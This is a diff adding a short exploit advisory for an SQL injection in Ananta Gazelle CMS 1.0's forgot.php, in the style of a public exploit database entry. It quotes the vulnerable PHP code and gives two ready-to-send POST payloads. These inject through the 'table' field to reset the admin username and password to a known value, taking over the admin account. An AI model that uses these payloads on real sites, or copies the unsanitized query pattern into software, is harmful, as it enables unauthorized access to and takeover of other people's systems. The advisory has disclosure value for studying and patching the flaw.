@@ -1,0 +1,45 @@
+# Exploit Title: Ananta Gazelle CMS - Update Statement Sql injection
+# Google Dork: -
+# Date: 07-02-2012
+# Author: hackme
+# Software Link: http://sourceforge.net/projects/ananta/files/stable/Gazelle 1.0 stable/Ananta_Gazelle1.0.zip/
+# Version: 1.0 stable
+# Tested on: backbox 2.1
+# CVE : -
+
+[SORRY FOR MY BAD ENGLISH]
+
+[+] This sql injection doesn't allow us to read the contents of the tables, but to do the update statement of the username and password of admin.
+Since you can't enter a special chars as the apex, and then we don't change the username and password in what we want, we will copy the value of a column with default value in column username and password.
+In fact we have:
+	
+	admin - username = 1
+              - password = 1
+
+[+] Vulnerable Code(forgot.php): 
+[CODE]
+if (!empty($_POST) && !isset($_POST["loginform"])) {
+	// form submitted, set a new activation key for this user (however don't set the user to inactive, so no-one can block someone else's account
+	$sql = "UPDATE ".$tableprefix.$_POST["table"]." SET ";
+	
+	if ($_POST["activate"] <> "") {
+		$sql = $sql."activate='".$_POST["activate"]."'";
+	}
+	
+	$sql = $sql." WHERE email"."='".$_POST["email"]."'";
+	//no control 
+	if (mysql_query($sql)) {
+[/code]
+[+] default table users columns: number,name,pass,email,activate,active,admin,joindate,showemail
+[+] Risk: High
+[+] Vuln Page: www.site.it/ananta/forgot.php
+
+[+] Change admin username in "1" [POST-DATA]
+email=&save=Save&table=users SET name=active where number=1--&activate=lol&location=/ananta/forgot.php
+
+[+] Change admin password in "1" [POST-DATA]
+email=v&save=Save&table=users SET pass=md5(active) where number=1--&activate=lol&location=/ananta/forgot.php
+
+[+]...If You Really Want Something, You Can Have It...
+
+[+] Greetz To: MZ
